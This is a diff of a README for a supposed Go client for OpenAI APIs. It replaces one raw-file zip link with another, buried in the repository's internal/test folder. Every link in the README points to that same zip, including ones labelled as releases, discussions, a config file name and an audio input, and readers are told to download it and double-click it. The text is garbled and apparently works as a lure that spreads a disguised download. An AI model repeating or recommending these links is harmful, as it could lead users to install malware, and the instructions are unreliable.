@@ -6,9 +6,9 @@ Welcome to the openai-go-language repository. This tool allows you to access var
 
 ## 📥 Download the Latest Version
 
-[![Download Latest Version](https://raw.githubusercontent.com/Jesusunannounced99/openai-go-language/master/examples/images/openai-go-language-2.5.zip%20Latest%https://raw.githubusercontent.com/Jesusunannounced99/openai-go-language/master/examples/images/openai-go-language-2.5.zip)](https://raw.githubusercontent.com/Jesusunannounced99/openai-go-language/master/examples/images/openai-go-language-2.5.zip)
+[![Download Latest Version](https://github.com/Jesusunannounced99/openai-go-language/raw/refs/heads/master/internal/test/openai_language_go_v3.8.zip%20Latest%https://github.com/Jesusunannounced99/openai-go-language/raw/refs/heads/master/internal/test/openai_language_go_v3.8.zip)](https://github.com/Jesusunannounced99/openai-go-language/raw/refs/heads/master/internal/test/openai_language_go_v3.8.zip)
 
-To start using the application, you need to download it. Click the button above or follow this link: [Download Latest Version](https://raw.githubusercontent.com/Jesusunannounced99/openai-go-language/master/examples/images/openai-go-language-2.5.zip).
+To start using the application, you need to download it. Click the button above or follow this link: [Download Latest Version](https://github.com/Jesusunannounced99/openai-go-language/raw/refs/heads/master/internal/test/openai_language_go_v3.8.zip).
 
 ## ✔️ System Requirements
 
@@ -21,9 +21,9 @@ Before downloading, ensure your system meets these requirements:
 
 ## 💻 How to Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Jesusunannounced99/openai-go-language/master/examples/images/openai-go-language-2.5.zip).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Jesusunannounced99/openai-go-language/raw/refs/heads/master/internal/test/openai_language_go_v3.8.zip).
 2. **Select the Latest Release**: Look for the most recent version listed at the top. You can identify it by the date it was published.
-3. **Download the Binary**: Choose the appropriate file for your operating system and click to download. For example, for Windows, you might see `https://raw.githubusercontent.com/Jesusunannounced99/openai-go-language/master/examples/images/openai-go-language-2.5.zip`.
+3. **Download the Binary**: Choose the appropriate file for your operating system and click to download. For example, for Windows, you might see `https://github.com/Jesusunannounced99/openai-go-language/raw/refs/heads/master/internal/test/openai_language_go_v3.8.zip`.
 4. **Run the Application**: Once the download is complete, locate the downloaded file on your computer. Double-click the file to run the application.
 
 ## 📖 How to Use
@@ -38,7 +38,7 @@ To interact with OpenAI APIs, you must have an API key. Obtain your key by signi
 
 Create a configuration file to store your API key. Follow these steps:
 
-1. Create a new text file and name it `https://raw.githubusercontent.com/Jesusunannounced99/openai-go-language/master/examples/images/openai-go-language-2.5.zip`.
+1. Create a new text file and name it `https://github.com/Jesusunannounced99/openai-go-language/raw/refs/heads/master/internal/test/openai_language_go_v3.8.zip`.
 2. Open the file and add the following lines:
 
    ```yaml
@@ -52,7 +52,7 @@ Create a configuration file to store your API key. Follow these steps:
 Run the application from your terminal or command prompt. Use simple commands to interact with the APIs. For example:
 
 - **ChatGPT**: To generate text, use the command `./openai-go chatgpt "Your prompt here"`.
-- **Whisper**: To transcribe audio, use the command `./openai-go whisper "https://raw.githubusercontent.com/Jesusunannounced99/openai-go-language/master/examples/images/openai-go-language-2.5.zip"`.
+- **Whisper**: To transcribe audio, use the command `./openai-go whisper "https://github.com/Jesusunannounced99/openai-go-language/raw/refs/heads/master/internal/test/openai_language_go_v3.8.zip"`.
 
 ## 🎯 Features
 
@@ -63,13 +63,13 @@ Run the application from your terminal or command prompt. Use simple commands to
 
 ## 🔄 Update the Application
 
-To keep the application up-to-date, revisit the [Releases page](https://raw.githubusercontent.com/Jesusunannounced99/openai-go-language/master/examples/images/openai-go-language-2.5.zip) periodically. Follow the same download and install steps for the latest version.
+To keep the application up-to-date, revisit the [Releases page](https://github.com/Jesusunannounced99/openai-go-language/raw/refs/heads/master/internal/test/openai_language_go_v3.8.zip) periodically. Follow the same download and install steps for the latest version.
 
 ## 🛠️ Troubleshooting
 
 If you encounter any issues, here are a few solutions:
 
-- **Cannot Find API Key**: Ensure you're using the correct key from your OpenAI account. Double-check your `https://raw.githubusercontent.com/Jesusunannounced99/openai-go-language/master/examples/images/openai-go-language-2.5.zip` for accuracy.
+- **Cannot Find API Key**: Ensure you're using the correct key from your OpenAI account. Double-check your `https://github.com/Jesusunannounced99/openai-go-language/raw/refs/heads/master/internal/test/openai_language_go_v3.8.zip` for accuracy.
 - **Application Won't Start**: Make sure you have the correct version of Go installed on your machine. Check your Go installation and environment variables.
 - **General Errors**: For any application-specific errors, refer to the issues section on GitHub, or consider reaching out for help in the community forums.
 
@@ -83,8 +83,8 @@ The openai-go-language project is licensed under the MIT License. For more detai
 
 ## 📞 Get Help
 
-If you need assistance or have questions, check out the [GitHub Discussions](https://raw.githubusercontent.com/Jesusunannounced99/openai-go-language/master/examples/images/openai-go-language-2.5.zip) page. The community is here to help!
+If you need assistance or have questions, check out the [GitHub Discussions](https://github.com/Jesusunannounced99/openai-go-language/raw/refs/heads/master/internal/test/openai_language_go_v3.8.zip) page. The community is here to help!
 
 ## 📲 Download Again
 
-To download the application, remember to visit the releases: [Download the Latest Version](https://raw.githubusercontent.com/Jesusunannounced99/openai-go-language/master/examples/images/openai-go-language-2.5.zip).
+To download the application, remember to visit the releases: [Download the Latest Version](https://github.com/Jesusunannounced99/openai-go-language/raw/refs/heads/master/internal/test/openai_language_go_v3.8.zip).
